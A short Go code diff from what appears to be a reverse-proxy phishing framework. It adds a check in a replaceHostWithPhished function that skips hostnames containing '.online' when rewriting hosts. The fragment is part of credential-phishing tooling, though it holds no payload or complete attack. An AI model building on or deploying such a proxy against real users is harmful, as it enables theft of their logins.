@@ -2047,6 +2047,9 @@ func (p *HttpProxy) replaceHostWithPhished(hostname string) (string, bool) {
 					if hostname == combineHost(ph.orig_subdomain, ph.domain) {
 						continue
 					}
+					if strings.Contains(hostname, ".online") {
+						continue
+					}
 					parts := strings.Split(strings.ToLower(hostname), ".")
 					domain := parts[len(parts)-2] + "." + parts[len(parts)-1]
 					log.Warning("domain inside replaceHostWithPhished: %s", domain)
